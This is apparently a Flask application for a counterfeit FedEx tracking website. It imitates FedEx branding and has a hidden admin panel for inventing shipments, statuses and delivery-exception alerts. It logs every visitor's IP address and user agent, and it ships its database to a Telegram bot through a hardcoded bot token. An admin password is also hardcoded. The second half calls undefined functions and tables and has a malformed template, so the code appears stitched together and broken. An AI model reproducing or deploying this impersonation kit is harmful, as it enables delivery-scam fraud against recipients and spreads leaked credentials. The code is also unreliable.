import os
import io
import sqlite3
import datetime
import random
import string
import gzip
import time
import urllib.request
import urllib.parse
import json
import threading
from functools import wraps
from flask import Flask, request, redirect, url_for, session, render_template_string

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "change-this-secret-key")

# Database configuration
DB_PATH = os.environ.get("DB_PATH", "/tmp/fedex.db")

# Telegram vault for DB persistence across Render restarts
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY")
TG_CHAT_ID = os.environ.get("TG_CHAT_ID", "8877118461")
VAULT_FILENAME = "fedex_db_backup.gz"
BACKUP_DEBOUNCE = 30  # seconds; min time between Telegram uploads

# Admin credentials
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "Deebaby25!")

CITIES = ["MEMPHIS, TN", "DALLAS, TX", "ATLANTA, GA", "INDIANAPOLIS, IN", "OAKLAND, CA", "GREENVILLE, SC"]

SERVICES = [
    "FedEx Ground",
    "FedEx Express Saver",
    "FedEx 2Day",
    "FedEx Standard Overnight",
    "FedEx Priority Overnight",
    "FedEx First Overnight",
    "FedEx 2Day AM",
    "FedEx Home Delivery",
    "FedEx International Priority",
    "FedEx International Economy",
    "FedEx SmartPost",
    "FedEx Freight"
]

# ---------------- Telegram vault helpers ----------------

def tg_api(method, params=None):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/{method}"
    data = urllib.parse.urlencode(params or {}).encode()
    req = urllib.request.Request(url, data=data)
    with urllib.request.urlopen(req, timeout=30) as resp:
        return json.loads(resp.read().decode())

def upload_backup_to_telegram():
    if not os.path.exists(DB_PATH):
        return
    buf = io.BytesIO()
    with open(DB_PATH, "rb") as f:
        buf.write(gzip.compress(f.read()))
    buf.seek(0)
    boundary = "----FedExBackupBoundary"
    body = io.BytesIO()
    body.write(f"--{boundary}\r\n".encode())
    body.write(f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{TG_CHAT_ID}\r\n'.encode())
    body.write(f"--{boundary}\r\n".encode())
    body.write(f'Content-Disposition: form-data; name="caption"\r\n\r\nFedEx DB backup {fmt_ts(datetime.datetime.now())}\r\n'.encode())
    body.write(f"--{boundary}\r\n".encode())
    body.write(f'Content-Disposition: form-data; name="document"; filename="{VAULT_FILENAME}"\r\n'.encode())
    body.write(b"Content-Type: application/gzip\r\n\r\n")
    body.write(buf.getvalue())
    body.write(f"\r\n--{boundary}--\r\n".encode())
    req = urllib.request.Request(
        f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendDocument",
        data=body.getvalue(),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
    with urllib.request.urlopen(req, timeout=60) as resp:
        json.loads(resp.read().decode())

def restore_db_from_telegram():
    """Download the latest backup document from Telegram and restore DB if local DB is missing/empty."""
    try:
        updates = tg_api("getUpdates", {"offset": -100, "limit": 100}).get("result", [])
    except Exception:
        return
    latest_file_id = None
    for upd in reversed(updates):
        msg = upd.get("message") or {}
        doc = msg.get("document")
        if doc and doc.get("file_name") == VAULT_FILENAME:
            latest_file_id = doc["file_id"]
            break
    if not latest_file_id:
        return
    try:
        link = tg_api("getFile", {"file_id": latest_file_id})["result"]["file_path"]
        url = f"https://api.telegram.org/file/bot{TG_BOT_TOKEN}/{link}"
        with urllib.request.urlopen(url, timeout=60) as resp:
            raw = gzip.decompress(resp.read())
        local_size = os.path.getsize(DB_PATH) if os.path.exists(DB_PATH) else 0
        # Only restore if local DB is missing or clearly empty/fresh
        if local_size < len(raw) or local_size == 0:
            with open(DB_PATH, "wb") as f:
                f.write(raw)
    except Exception:
        pass

_backup_lock = threading.Lock()
_last_backup_time = 0.0

def schedule_backup():
    """Debounced backup: upload at most once every BACKUP_DEBOUNCE seconds."""
    global _last_backup_time
    if not _backup_lock.acquire(blocking=False):
        return
    def _do():
        global _last_backup_time
        try:
            elapsed = time.time() - _last_backup_time
            if elapsed < BACKUP_DEBOUNCE:
                time.sleep(BACKUP_DEBOUNCE - elapsed)
            upload_backup_to_telegram()
            _last_backup_time = time.time()
        except Exception:
            pass
        finally:
            _backup_lock.release()
    threading.Thread(target=_do, daemon=True).start()

# ---------------- App helpers ----------------

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get("admin"):
            return redirect(url_for("admin_login"))
        return f(*args, **kwargs)
    return decorated_function

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA busy_timeout=5000")
    return conn

def fmt_ts(dt):
    return dt.strftime("%b %d, %Y %I:%M %p").upper()

def parse_dt(date_str, time_str):
    try:
        return datetime.datetime.strptime(f"{date_str} {time_str}", "%Y-%m-%d %H:%M")
    except Exception:
        return datetime.datetime.now()

def add_event_internal(c, tn, dt, location, description, details="", exception=0):
    c.execute("""INSERT INTO events (tracking_number, timestamp, location, description, details, exception)
                 VALUES (?, ?, ?, ?, ?, ?)""",
              (tn, fmt_ts(dt), location, description, details, exception))

def init_db():
    db_dir = os.path.dirname(DB_PATH)
    if db_dir:
        os.makedirs(db_dir, exist_ok=True)
    restore_db_from_telegram()
    conn = get_db()
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS trackings (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tracking_number TEXT UNIQUE,
        sender_name TEXT,
        recipient_name TEXT,
        recipient_address TEXT,
        service_type TEXT,
        weight TEXT,
        pieces TEXT,
        reference TEXT,
        status TEXT,
        created_at TEXT,
        eta TEXT
    )""")
    c.execute("""CREATE TABLE IF NOT EXISTS events (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        tracking_number TEXT,
        timestamp TEXT,
        location TEXT,
        description TEXT,
        details TEXT,
        exception INTEGER DEFAULT 0
    )""")
    cols = [r[1] for r in c.execute("PRAGMA table_info(events)").fetchall()]
    if "exception" not in cols:
        c.execute("ALTER TABLE events ADD COLUMN exception INTEGER DEFAULT 0")
    tcols = [r[1] for r in c.execute("PRAGMA table_info(trackings)").fetchall()]
    if "exception" not in tcols:
        c.execute("ALTER TABLE trackings ADD COLUMN exception TEXT")
    if "exception_at" not in tcols:
        c.execute("ALTER TABLE trackings ADD COLUMN exception_at TEXT")
    if "prev_status" not in tcols:
        c.execute("ALTER TABLE trackings ADD COLUMN prev_status TEXT")
    c.execute("CREATE INDEX IF NOT EXISTS idx_events_tn ON events(tracking_number)")
    conn.commit()
    conn.close()
    seed_demo_data()

def seed_demo_data():
    conn = get_db()
    c = conn.cursor()
    count = c.execute("SELECT COUNT(*) FROM trackings").fetchone()[0]
    if count == 0:
        now = datetime.datetime.now()
        tn = "123456789012"
        eta = now + datetime.timedelta(days=2)
        eta_str = eta.strftime("%b %d") + " by 4:30 pm"
        c.execute("""INSERT INTO trackings
            (tracking_number, sender_name, recipient_name, recipient_address, service_type, weight, pieces, reference, status, created_at, eta)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (tn, "ACME WIDGETS LLC", "MICHAEL HARRIS", "2814 OAK LN, AUSTIN TX 78704",
             "FedEx Ground", "4.2 lbs", "1", "PO-88213", "In transit - on time",
             fmt_ts(now), eta_str))
        add_event_internal(c, tn, now - datetime.timedelta(hours=6), "DALLAS, TX", "Picked up", "Tendered at FedEx origin facility")
        add_event_internal(c, tn, now - datetime.timedelta(hours=3), "DALLAS, TX", "In transit", "Departed FedEx location")
        conn.commit()
    conn.close()

def rand_ref():
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

BASE_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>{{ title }}</title>
   <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' fill='%23ffffff'/><text x='16' y='23' font-size='14' font-weight='700' font-style='italic' text-anchor='middle' font-family='Arial'><tspan fill='%234d148c'>Fe</tspan><tspan fill='%23ff6600'>dx</tspan></text></svg>">
   <style>
        * { box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; padding: 0; background: #ffffff; color: #333; }
        a { color: #4d148c; }
        header { background-color: #ffffff; border-bottom: 1px solid #e5e5e5; padding: 0; }
        .container { max-width: 1000px; margin: 0 auto; padding: 0 20px; }
        .header-content { display: flex; justify-content: space-between; align-items: center; padding: 12px 0; }
        .logo-wrap { display: flex; align-items: flex-end; gap: 18px; }
        .logo-svg { height: 34px; display: block; }
        .logo-sub { font-size: 15px; color: #6b6b6b; font-weight: 400; letter-spacing: .5px; padding-bottom: 3px; border-left: 1px solid #ddd; padding-left: 18px; height: 26px; display: flex; align-items: center; }
        .top-links { font-size: 13px; }
        .top-links a { color: #6b6b6b; text-decoration: none; margin-left: 22px; }
        .top-links a:hover { color: #4d148c; }
        nav { background: #4d148c; }
        nav .container { display: flex; }
        nav a { color: white; text-decoration: none; padding: 12px 18px; font-size: 14px; font-weight: 600; display: block; }
        nav a:hover { background: #3a0f6b; }
        nav a.active { background: transparent; box-shadow: inset 0 -4px 0 #ff6600; }
        .main-content { background: white; min-height: 400px; padding: 40px 20px; }
        .search-box { text-align: center; margin-bottom: 30px; }
        .search-box h1 { font-size: 26px; margin-bottom: 6px; font-weight: 500; }
        .search-box h1 .fed { color: #4d148c; font-style: italic; font-weight: 800; letter-spacing: -1px; }
        .search-box h1 .ex { color: #ff6600; font-style: italic; font-weight: 800; letter-spacing: -1px; }
        .search-box .sub { color: #75757a; font-size: 15px; margin-bottom: 24px; }
        .input-group { display: inline-flex; gap: 10px; }
        input[type="text"] { padding: 12px 15px; width: 340px; border: 1px solid #bdbcbd; border-radius: 3px; font-size: 16px; }
        input[type="text"]:focus { outline: none; border-color: #4d148c; box-shadow: 0 0 0 2px rgba(77,20,140,0.15); }
        button { background-color: #ff6600; color: white; border: none; padding: 12px 30px; font-size: 15px; font-weight: bold; border-radius: 3px; cursor: pointer; }
        button:hover { background-color: #e55b00; }
        .error-msg { background-color: #fdf2f2; border-left: 4px solid #cc0000; color: #721c24; padding: 15px 18px; border-radius: 3px; margin-top: 20px; text-align: left; max-width: 600px; margin-left: auto; margin-right: auto; font-size: 14px; }
        .flash-msg { max-width: 900px; margin: 0 auto 20px; padding: 12px 18px; border-radius: 3px; font-size: 14px; background: #f0fff4; border-left: 4px solid #2e7d32; color: #2e7d32; }
        .result-card { max-width: 820px; margin: 0 auto; border: 1px solid #e0e0e0; background: #fff; }
        .result-card.has-exception { border-color: #e0b3b3; }
        .result-header { padding: 22px; border-bottom: 1px solid #eee; background: #fafafa; }
        .result-header.exc { background: #fdf3f3; border-bottom: 1px solid #f0d0d0; }
        .result-header h2 { margin: 0; font-size: 14px; color: #75757a; font-weight: 500; text-transform: uppercase; letter-spacing: .5px; }
        .result-header .status { font-size: 22px; font-weight: 700; color: #333; margin-top: 6px; }
        .result-header .status.exc { color: #cc0000; }
        .result-header .eta { font-size: 14px; color: #75757a; margin-top: 4px; }
        .progress-header { display: flex; align-items: center; justify-content: center; gap: 12px; background: #fafafa; padding: 18px 22px 8px; }
        .progress-header .mini-logo { height: 22px; display: block; }
        .progress-header .ph { font-size: 12px; text-transform: uppercase; letter-spacing: 1px; color: #75757a; font-weight: 600; }
        .progress-bar { display: flex; gap: 4px; padding: 0 22px 0; background: #fafafa; }
        .progress-bar span { flex: 1; height: 5px; background: #ddd; border-radius: 3px; }
        .progress-bar span.on { background: #ff6600; }
        .progress-bar span.exc { background: #cc0000; }
        .progress-labels { display: flex; justify-content: space-between; max-width: 820px; margin: 0 auto; padding: 6px 22px 16px; background: #fafafa; font-size: 11px; color: #888; text-transform: uppercase; letter-spacing: .5px; }
        .progress-labels span.exc { color: #cc0000; font-weight: 700; }
        .exc-banner { background: #fdf2f2; border-left: 4px solid #cc0000; padding: 14px 18px; margin: 0 22px 20px; color: #721c24; font-size: 14px; border-radius: 3px; }
        .exc-banner strong { display: block; margin-bottom: 4px; font-size: 12px; text-transform: uppercase; letter-spacing: .6px; }
        .exc-time { font-size: 12px; color: #a15c5c; margin-top: 6px; }
        .result-details { padding: 20px 22px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 20px; font-size: 14px; }
        .detail-col strong { display: block; color: #75757a; font-size: 11px; margin-bottom: 4px; text-transform: uppercase; letter-spacing: .5px; font-weight: 600; }
        .timeline { padding: 22px; }
        .timeline h3 { font-size: 13px; text-transform: uppercase; color: #75757a; margin-bottom: 18px; letter-spacing: 1px; font-weight: 600; }
        .event { display: flex; gap: 0; padding-bottom: 16px; margin-bottom: 16px; border-bottom: 1px solid #f0f0f0; position: relative; }
        .event:last-child { border-bottom: none; }
        .event-marker { min-width: 26px; padding-top: 4px; }
        .event-marker .dot { width: 9px; height: 9px; border-radius: 50%; background: #ff6600; display: block; }
        .event.exception .event-marker .dot { background: #cc0000; }
        .event.exception .event-desc { color: #cc0000; }
        .event.exception .event-loc { color: #a33; }
        .event-time { min-width: 165px; font-size: 13px; color: #75757a; padding-top: 2px; }
        .event-info { flex: 1; }
        .event-desc { font-weight: bold; font-size: 14px; color: #333; }
        .event-loc { font-size: 13px; color: #75757a; margin-top: 2px; }
        .disclaimer { max-width: 820px; margin: 24px auto 0; font-size: 12px; color: #888; line-height: 1.5; }
        .adm-exc { background: #fdf2f2; border: 1px solid #e0b3b3; padding: 16px; margin-bottom: 20px; }
        .adm-exc h3 { margin-top: 0; color: #cc0000; font-size: 15px; text-transform: uppercase; letter-spacing: .5px; }
        .exc-live { color: #cc0000; font-weight: 700; margin: 0 0 10px; font-size: 14px; }
        .exc-live small { color: #a15c5c; font-weight: 400; }
        .exc-form { display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap; }
        .exc-form input[type="text"] { flex: 1; min-width: 180px; padding: 8px; width: auto; font-size: 14px; }
        .btn-red { background: #cc0000; color: #fff; border: none; padding: 8px 14px; cursor: pointer; font-weight: 700; border-radius: 3px; font-size: 13px; }
        .btn-red:hover { background: #a80000; }
        .btn-clear { background: #fff; color: #cc0000; border: 1px solid #cc0000; padding: 8px 14px; cursor: pointer; font-weight: 700; border-radius: 3px; font-size: 13px; }
        .btn-clear:hover { background: #fdf2f2; }
        footer { background: #4d148c; color: #fff; margin-top: 40px; }
        footer .fcontainer { max-width: 1000px; margin: 0 auto; padding: 26px 20px; }
        footer .flinks { display: flex; flex-wrap: wrap; gap: 8px 24px; font-size: 13px; margin-bottom: 18px; }
        footer .flinks a { color: #fff; text-decoration: none; opacity: .9; }
        footer .flinks a:hover { text-decoration: underline; }
        footer .tagline { font-size: 13px; opacity: .7; }
        footer .legal { font-size: 11px; opacity: .6; margin-top: 10px; line-height: 1.6; }
        @media (max-width: 600px) {
            .logo-sub { display: none; }
            .input-group { flex-direction: column; }
            input[type="text"] { width: 100%; }
            .event-time { min-width: 110px; }
        }
   </style>
</head>
<body>
   <header>
       <div class="container header-content">
            <div class="logo-wrap">
                <svg class="logo-svg" viewBox="0 0 600 120" xmlns="http://www.w3.org/2000/svg" aria-label="FedEx">
                  <text x="0" y="88" font-family="Arial, Helvetica, sans-serif" font-size="100" font-weight="bold" font-style="italic" letter-spacing="-6"><tspan fill="#4d148c">Fed</tspan><tspan fill="#ff6600">Ex</tspan></text>
                </svg>
                <span class="logo-sub">Tracking</span>
            </div>
            <div class="top-links">
                <a href="#">Log In</a>
                <a href="#">Support</a>
            </div>
       </div>
   </header>
    <nav>
        <div class="container">
            <a href="/" class="active">TRACKING</a>
            <a href="#">SHIPPING</a>
            <a href="#">LOCATIONS</a>
            <a href="#">SUPPORT</a>
        </div>
    </nav>

   <div class="container main-content">
       {% with messages = get_flashed_messages(with_categories=true) %}
           {% for category, message in messages %}
               <div class="flash-msg">{{ message }}</div>
           {% endfor %}
       {% endwith %}
       {{ content | safe }}
   </div>

   <footer>
        <div class="fcontainer">
            <div class="flinks">
                <a href="#">About FedEx</a>
                <a href="#">Careers</a>
                <a href="#">Privacy &amp; Security</a>
                <a href="#">Terms of Use</a>
                <a href="#">Site Map</a>
                <a href="#">Contact Us</a>
            </div>
            <div class="tagline">FedEx. Solutions that matter.</div>
            <div class="legal">&copy; 1995-2026 FedEx. All rights reserved. This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.</div>
        </div>
   </footer>
</body>
</html>
"""

INDEX_TEMPLATE = """
<div class="search-box">
   <h1><span class="fed">Fed</span><span class="ex">Ex</span> Tracking</h1>
   <div class="sub">Enter your tracking number to see the latest status of your shipment.</div>
   <form action="/" method="post" class="input-group">
        <input type="text" name="tracking_number" value="{{ tn }}" placeholder="Enter tracking number" required autofocus>
        <button type="submit">TRACK</button>
   </form>
   {% if error %}<div class="error-msg">{{ error }}</div>{% endif %}
</div>

{% if tracking %}
{% set is_exc = tracking['exception'] %}
<div class="result-card{% if is_exc %} has-exception{% endif %}">
   <div class="result-header{% if is_exc %} exc{% endif %}">
       <h2>Tracking Number: {{ tracking['tracking_number'] }}</h2>
       <div class="status{% if is_exc %} exc{% endif %}">{{ tracking['status'] }}</div>
       <div class="eta{% if is_exc %} exc{% endif %}">{% if is_exc %}Estimated Delivery: <strong>Delayed</strong>{% else %}Estimated Delivery: <strong>{{ tracking['eta'] }}</strong>{% endif %}</div>
   </div>
    <div class="progress-header">
        <svg class="mini-logo" viewBox="0 0 600 120" xmlns="http://www.w3.org/2000/svg" aria-label="FedEx">
          <text x="0" y="88" font-family="Arial, Helvetica, sans-serif" font-size="100" font-weight="bold" font-style="italic" letter-spacing="-6"><tspan fill="#4d148c">Fed</tspan><tspan fill="#ff6600">Ex</tspan></text>
        </svg>
        <span class="ph">Shipment Progress</span>
    </div>
    <div class="progress-bar">
        <span class="{% if is_exc %}exc{% elif 'Delivered' in tracking['status'] or 'Out for delivery' in tracking['status'] or 'In transit' in tracking['status'] %}on{% endif %}"></span>
        <span class="{% if not is_exc and ('Out for delivery' in tracking['status'] or 'Delivered' in tracking['status']) %}on{% endif %}"></span>
        <span class="{% if not is_exc and 'Delivered' in tracking['status'] %}on{% endif %}"></span>
    </div>
    <div class="progress-labels">
        <span class="{% if is_exc %}exc{% endif %}">In Transit</span>
        <span>Out for Delivery</span>
        <span>Delivered</span>
    </div>
   {% if is_exc %}
   <div class="exc-banner">
       <strong>&#9888; Delivery Exception</strong>
       {{ tracking['exception'] }}
       {% if tracking['exception_at'] %}<div class="exc-time">Reported {{ tracking['exception_at'] }}</div>{% endif %}
   </div>
   {% endif %}
   <div class="result-details">
       <div class="detail-col">
           <strong>From</strong>
           {{ tracking['sender_name'] }}
       </div>
       <div class="detail-col">
           <strong>To</strong>
           {{ tracking['recipient_name'] }}<br>
           {{ tracking['recipient_address'] }}
       </div>
       <div class="detail-col">
           <strong>Service</strong>
           {{ tracking['service_type'] }}
       </div>
       <div class="detail-col">
           <strong>Weight</strong>
           {{ tracking['weight'] }}
       </div>
   </div>
   <div class="timeline">
       <h3>Travel History</h3>
       {% for e in events %}
       <div class="event{% if e['exception'] %} exception{% endif %}">
           <div class="event-marker"><span class="dot"></span></div>
           <div class="event-time">{{ e['timestamp'] }}</div>
           <div class="event-info">
               <div class="event-desc">{{ e['description'] }}</div>
               <div class="event-loc">{{ e['location'] }}{% if e['details'] %} - {{ e['details'] }}{% endif %}</div>
           </div>
       </div>
       {% endfor %}
   </div>
</div>
<div class="disclaimer">
    Shipment tracking information is provided as a convenience. Delivery times are estimates and not guaranteed. For assistance, contact FedEx Customer Service at 1-800-555-0187.
</div>
{% endif %}
"""

ADMIN_DASHBOARD_TEMPLATE = """
<div style="max-width: 900px; margin: 0 auto;">
   <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
       <h2 style="margin: 0; color: #4d148c;">Admin Dashboard</h2>
        <a href="/control-panel-8471/logout" style="color: #666; text-decoration: none; font-size: 14px;">Logout</a>
   </div>
   <div style="background: #f9f9f9; padding: 20px; border: 1px solid #ddd; margin-bottom: 30px;">
       <h3 style="margin-top: 0;">Create New Shipment</h3>
       <form action="/admin/create" method="post" style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
           <input type="text" name="tracking_number" placeholder="Tracking Number (auto if blank)" style="padding: 8px;">
           <input type="text" name="sender_name" placeholder="Sender Name" style="padding: 8px;" required>
           <input type="text" name="recipient_name" placeholder="Recipient Name" style="padding: 8px;" required>
           <input type="text" name="recipient_address" placeholder="Recipient Address" style="padding: 8px;" required>
           <select name="service_type" style="padding: 8px;" required>
               {% for s in services %}
               <option value="{{ s }}">{{ s }}</option>
               {% endfor %}
           </select>
           <input type="text" name="weight" placeholder="Weight (e.g. 4.2 lbs)" style="padding: 8px;" required>
           <input type="text" name="pieces" placeholder="Pieces" style="padding: 8px;" required>
           <input type="text" name="reference" placeholder="Reference (auto if blank)" style="padding: 8px;">
           <input type="text" name="origin_city" placeholder="Origin City (e.g. GREENVILLE, SC)" style="padding: 8px;" required>
           <input type="text" name="status" placeholder="Initial Status (e.g. In transit - on time)" style="padding: 8px;" required>
           <label style="font-size: 13px; color: #555;">Shipment Date &amp; Time</label>
           <div style="display: flex; gap: 10px;">
               <input type="date" name="ship_date" value="{{ today }}" style="padding: 8px; flex: 1;">
               <input type="time" name="ship_time" value="{{ now_time }}" style="padding: 8px; flex: 1;">
           </div>
           <label style="font-size: 13px; color: #555;">ETA Date</label>
           <input type="date" name="eta_date" value="{{ eta_default }}" style="padding: 8px;">
           <div style="grid-column: 1 / -1;">
               <button type="submit" style="width: 100%;">Create Shipment</button>
           </div>
       </form>
   </div>
    <h3>Existing Shipments</h3>
   <table style="width: 100%; border-collapse: collapse; background: white; border: 1px solid #ddd;">
       <thead>
           <tr style="background: #4d148c; color: white; text-align: left;">
               <th style="padding: 10px;">Tracking #</th>
               <th style="padding: 10px;">Recipient</th>
               <th style="padding: 10px;">Status</th>
               <th style="padding: 10px;">ETA</th>
               <th style="padding: 10px;">Actions</th>
           </tr>
       </thead>
       <tbody>
           {% for t in trackings %}
           <tr style="border-bottom: 1px solid #eee;{% if t['exception'] %} background: #fdf7f7;{% endif %}">
               <td style="padding: 10px;"><a href="/control-panel-8471/track/{{ t['tracking_number'] }}">{{ t['tracking_number'] }}</a></td>
               <td style="padding: 10px;">{{ t['recipient_name'] }}</td>
               <td style="padding: 10px;{% if t['exception'] %} color: #cc0000; font-weight: bold;{% endif %}">{{ t['status'] }}</td>
               <td style="padding: 10px;">{{ t['eta'] }}</td>
               <td style="padding: 10px;"><a href="/control-panel-8471/track/{{ t['tracking_number'] }}">Manage</a></td>
           </tr>
           {% endfor %}
       </tbody>
   </table>
</div>
"""

ADMIN_TRACK_TEMPLATE = """
<div style="max-width: 900px; margin: 0 auto;">
    <a href="/control-panel-8471" style="color: #4d148c; text-decoration: none; font-size: 14px;">&larr; Back to Dashboard</a>
   <h2 style="color: #4d148c;">Manage: {{ tracking['tracking_number'] }}</h2>

   <div style="background: #f9f9f9; padding: 20px; border: 1px solid #ddd; margin-bottom: 20px;">
       <p><strong>Status:</strong> {{ tracking['status'] }}</p>
       <p><strong>ETA:</strong> {{ tracking['eta'] }}</p>
        <p><strong>Recipient:</strong> {{ tracking['recipient_name'] }} - {{ tracking['recipient_address'] }}</p>
       <form action="/admin/update/{{ tracking['tracking_number'] }}" method="post" style="display: flex; gap: 10px; margin-top: 15px;">
           <input type="text" name="status" value="{{ tracking['status'] }}" placeholder="New status" style="flex: 1; padding: 8px;">
                      <button type="submit" style="padding: 8px 15px; background: #333; color: white; border: none; cursor: pointer;">Update</button>
       </form>
       <form action="/admin/delete/{{ tracking['tracking_number'] }}" method="post" style="margin-top: 10px;">
           <button type="submit" style="padding: 6px 12px; background: #a33; color: white; border: none; cursor: pointer;" onclick="return confirm('Delete this shipment?')">Delete</button>
       </form>
       <p style="margin-top: 10px; font-size: 12px; color: #666;">Tracking #: {{ tracking['tracking_number'] }}</p>
   </div>
   {% else %}
   <p>No shipments yet. <a href="/admin/new">Create one</a>.</p>
   {% endfor %}
</body>
</html>
"""


@app.route("/admin")
def admin_index():
    """Admin dashboard listing all tracked shipments."""
    ensure_db()
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute(
                "SELECT * FROM shipments ORDER BY created_at DESC"
            ).fetchall()
            shipments = [dict(r) for r in rows]
    except sqlite3.Error as e:
        return render_template_string(
            ADMIN_PAGE.replace("<!--LOOP-->", "<!--LOOP-->"),
            trackings=[],
            error=str(e),
        )

    loop_html = ""
    if not shipments:
        loop_html = "<p>No shipments yet. <a href=\"/admin/new\">Create one</a>.</p>"
    else:
        for s in shipments:
            loop_html += render_loop_item(s)

    page = ADMIN_PAGE.replace("<!--LOOP-->", loop_html)
    return render_template_string(page)


def render_loop_item(s):
    """Render one admin shipment card."""
    return f"""
   <div style="background: #f9f9f9; padding: 20px; border: 1px solid #ddd; margin-bottom: 20px;">
       <p><strong>Status:</strong> {s.get('status', '')}</p>
       <p><strong>ETA:</strong> {s.get('eta', '')}</p>
       <p><strong>Recipient:</strong> {s.get('recipient_name', '')} - {s.get('recipient_address', '')}</p>
       <form action="/admin/update/{s.get('tracking_number', '')}" method="post" style="display: flex; gap: 10px; margin-top: 15px;">
           <input type="text" name="status" value="{s.get('status', '')}" placeholder="New status" style="flex: 1; padding: 8px;">
           <button type="submit" style="padding: 8px 15px; background: #333; color: white; border: none; cursor: pointer;">Update</button>
       </form>
       <form action="/admin/delete/{s.get('tracking_number', '')}" method="post" style="margin-top: 10px;">
           <button type="submit" style="padding: 6px 12px; background: #a33; color: white; border: none; cursor: pointer;" onclick="return confirm('Delete this shipment?')">Delete</button>
       </form>
       <p style="margin-top: 10px; font-size: 12px; color: #666;">Tracking #: {s.get('tracking_number', '')}</p>
   </div>
"""


@app.route("/admin/new", methods=["GET", "POST"])
def admin_new():
    """Form to create a new shipment."""
    ensure_db()
    if request.method == "POST":
        tracking_number = (request.form.get("tracking_number") or "").strip().upper()
        recipient_name = (request.form.get("recipient_name") or "").strip()
        recipient_address = (request.form.get("recipient_address") or "").strip()
        status = (request.form.get("status") or "Label created").strip()
        eta = (request.form.get("eta") or "").strip()

        if not tracking_number:
            tracking_number = generate_tracking_number()

        now = int(time.time())
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.execute(
                    """INSERT OR REPLACE INTO shipments
                       (tracking_number, recipient_name, recipient_address, status, eta, created_at, updated_at)
                       VALUES (?, ?, ?, ?, ?, ?, ?)""",
                    (tracking_number, recipient_name, recipient_address, status, eta, now, now),
                )
                conn.commit()
        except sqlite3.Error as e:
            return render_template_string(NEW_PAGE, error=str(e), values=request.form)

        notify_backup()
        return redirect("/admin")

    return render_template_string(NEW_PAGE, error=None, values={})


@app.route("/admin/update/<tracking_number>", methods=["POST"])
def admin_update(tracking_number):
    """Update the status line of a shipment."""
    ensure_db()
    new_status = (request.form.get("status") or "").strip()
    if not new_status:
        return redirect("/admin")

    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "UPDATE shipments SET status = ?, updated_at = ? WHERE tracking_number = ?",
                (new_status, int(time.time()), tracking_number),
            )
            conn.commit()
    except sqlite3.Error:
        pass

    notify_backup()
    return redirect("/admin")


@app.route("/admin/delete/<tracking_number>", methods=["POST"])
def admin_delete(tracking_number):
    """Delete a shipment record."""
    ensure_db()
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "DELETE FROM shipments WHERE tracking_number = ?", (tracking_number,)
            )
            conn.commit()
    except sqlite3.Error:
        pass

    notify_backup()
    return redirect("/admin")


@app.route("/admin/visits")
def admin_visits():
    """Show recent visit log entries."""
    ensure_db()
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            rows = conn.execute(
                "SELECT * FROM visits ORDER BY created_at DESC LIMIT 200"
            ).fetchall()
            visits = [dict(r) for r in rows]
    except sqlite3.Error as e:
        return f"<pre>DB error: {e}</pre>"

    out = ["<html><body style='font-family: monospace; padding: 20px;'>"]
    out.append("<h2>Recent Visits</h2><a href='/admin'>&larr; Back</a><hr>")
    if not visits:
        out.append("<p>No visits logged yet.</p>")
    else:
        for v in visits:
            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(v.get("created_at", 0)))
            out.append(
                f"<p><b>{ts}</b> &mdash; {v.get('ip', '')} "
                f"<br>UA: {v.get('user_agent', '')}"
                f"<br>Path: {v.get('path', '')}</p><hr>"
            )
    out.append("</body></html>")
    return "".join(out)


@app.route("/admin/notify", methods=["POST"])
def admin_notify():
    """Trigger a manual Telegram backup."""
    notify_backup()
    return redirect("/admin")


@app.before_request
def log_visit():
    """Log every non-static request into the visits table."""
    if request.path.startswith("/static"):
        return
    try:
        ensure_db()
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO visits (ip, user_agent, path, created_at) VALUES (?, ?, ?, ?)",
                (
                    request.headers.get("X-Forwarded-For", request.remote_addr or ""),
                    (request.headers.get("User-Agent") or "")[:400],
                    request.path[:300],
                    int(time.time()),
                ),
            )
            conn.commit()
    except sqlite3.Error:
        pass


if __name__ == "__main__":
    init_db()
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
